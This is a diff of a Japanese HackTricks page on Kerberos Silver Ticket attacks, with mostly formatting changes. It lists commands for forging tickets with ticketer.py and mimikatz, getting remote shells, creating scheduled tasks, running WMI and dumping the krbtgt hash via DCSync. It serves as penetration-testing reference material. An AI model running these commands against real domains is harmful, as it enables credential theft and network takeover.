@@ -6,17 +6,17 @@
 
 HackTricksをサポートする他の方法：
 
-- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
-- **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**する。
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**telegramグループ**](https://t.me/peass)**に参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
+* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**する。
 
 </details>
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得し始めましょう！
+**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大\*\*$100,000\*\*のバウンティを獲得し始めましょう！
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -27,12 +27,15 @@ HackTricksをサポートする他の方法：
 チケットの作成には、オペレーティングシステムに基づいて異なるツールが使用されます：
 
 ### Linux上
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Windows上
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,18 +47,19 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 ## 利用可能なサービス
 
-| サービスタイプ                             | サービスシルバーチケット                                               |
-| ---------------------------------------- | -------------------------------------------------------------------- |
-| WMI                                      | <p>HOST</p><p>RPCSS</p>                                              |
-| PowerShellリモート                        | <p>HOST</p><p>HTTP</p><p>OSによっては:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                    | <p>HOST</p><p>HTTP</p><p>場合によっては: WINRM</p>                 |
-| スケジュールタスク                        | HOST                                                                 |
-| Windowsファイル共有、またpsexec           | CIFS                                                                 |
-| LDAP操作、DCSyncを含む                   | LDAP                                                                 |
-| Windowsリモートサーバー管理ツール         | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                   |
-| ゴールデンチケット                         | krbtgt                                                               |
+| サービスタイプ                | サービスシルバーチケット                                                  |
+| ---------------------- | ------------------------------------------------------------- |
+| WMI                    | <p>HOST</p><p>RPCSS</p>                                       |
+| PowerShellリモート         | <p>HOST</p><p>HTTP</p><p>OSによっては:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                  | <p>HOST</p><p>HTTP</p><p>場合によっては: WINRM</p>                   |
+| スケジュールタスク              | HOST                                                          |
+| Windowsファイル共有、またpsexec | CIFS                                                          |
+| LDAP操作、DCSyncを含む       | LDAP                                                          |
+| Windowsリモートサーバー管理ツール   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                            |
+| ゴールデンチケット              | krbtgt                                                        |
 
 **Rubeus**を使用して、以下のパラメータを使用してこれらのチケットをすべて要求できます:
 
@@ -74,14 +78,17 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 ### CIFS
 
 このチケットを使用すると、`C$`および`ADMIN$`フォルダに**SMB**経由でアクセスし、リモートファイルシステムの一部にファイルをコピーすることができます。
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### ホスト
 
 この権限を使用すると、リモートコンピューターでスケジュールされたタスクを生成し、任意のコマンドを実行できます。
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +100,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 これらのチケットを使用すると、**被害者システムでWMIを実行**できます。
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -105,24 +114,29 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 以下のページで**wmiexecに関する詳細情報**を見つける：
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### ホスト + WSMAN (WINRM)
 
 コンピューター上でwinrmアクセスを使用すると、**アクセス**してPowerShellを取得できます：
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 ### LDAP
 
 この権限を使用すると、**DCSync**を使用してDCデータベースをダンプできます。
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **DCSyncについて**は、以下のページで詳細を学ぶ：
 
 ## 参考文献
@@ -136,7 +150,7 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**バグバウンティのヒント**: **Intigriti**に**サインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**に参加しましょう！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)で今すぐ登録して、最大**$100,000**のバウンティを獲得しましょう！
+**バグバウンティのヒント**: **Intigriti**に**サインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**に参加しましょう！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)で今すぐ登録して、最大\*\*$100,000\*\*のバウンティを獲得しましょう！
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
